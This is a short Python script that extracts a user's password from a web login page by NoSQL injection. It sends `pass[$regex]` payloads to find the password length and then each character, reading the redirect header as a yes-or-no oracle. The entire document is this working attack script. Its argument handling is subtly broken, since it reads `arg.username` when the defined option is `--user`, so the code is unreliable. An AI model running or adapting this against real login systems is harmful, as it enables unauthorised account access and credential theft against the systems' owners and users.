import requests
import argparse

parser = argparse.ArgumentParser(description='Brute force password for nosql databases.')
parser.add_argument('--host', type=str, help='Target Ip')
parser.add_argument('--user', type=str, help='Enumerated host name')
arg = parser.parse_args()

url = f'http://{arg.host}/login.php'
words = '1234567890abcdefghijklmnopqrstuvwxyz'
uName = arg.username

# Guessing Password Length using regex user=userName&pass[$regex]=^.{1}$&remember=on
i=1
while True:
    myData = 'user='+uName+'&pass[$regex]=^.{'+str(i)+'}$&remember=on'
    sReq = requests.post(url, data=myData, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'})
    answers = sReq.headers
    if answers['Location'] != '/?err=1':
        pLength = i
        break
    else:
        i+=1

print(f'Password length: {pLength}')

numb = 20 + len(uName)
password = ''

# adding . for each character in password for regex.    user=userName&pass[$regex]=^...........$&remember=on
dots=''
for i in range(pLength):
    dots += '.'
myData = 'user='+uName+'&pass[$regex]=^'+dots+'$&remember=on'
print(myData)

# Trying one character at a time replacing one . at a time.      user=userName&pass[$regex]=^C.........$&remember=on
while pLength:
    for i in words:
        myData = myData[:numb]+i+myData[numb+1:]
        x = requests.post(url, data=myData, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        answers = x.headers

        # Not getting redirected to error page means we have that one characted and we can move on to enumerating teh next character.
        if answers['Location'] != '/?err=1':
            password += i
            pLength-=1
            numb+=1
            print(myData)
            break
            
print(f'Password = {password}\nData: {myData[:10+len(uName)]}={password}{myData[-12:]}')

